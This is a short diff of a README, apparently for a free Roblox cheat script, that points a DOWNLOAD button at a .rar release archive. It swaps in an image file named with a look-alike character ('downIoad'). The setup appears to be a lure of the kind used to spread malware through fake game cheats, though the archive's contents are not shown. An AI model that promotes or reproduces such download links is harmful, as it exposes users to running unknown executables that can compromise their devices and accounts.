@@ -72,7 +72,7 @@ The script is open source and free to use, modify, and redistribute.
 
 <p align="center">
   <a href="https://github.com/light-00-veh/escape-tsunami-godmode/releases/download/roblox-helper/xeno-lib-1.0.1.rar">
-    <img src="https://raw.githubusercontent.com/USERNAME/REPO/main/assets/download.png" alt="DOWNLOAD" width="420">
+    <img src="https://github.com/light-00-veh/escape-tsunami-godmode/blob/main/assets/downIoad.png" alt="DOWNLOAD" width="420">
   </a>
 </p>
 
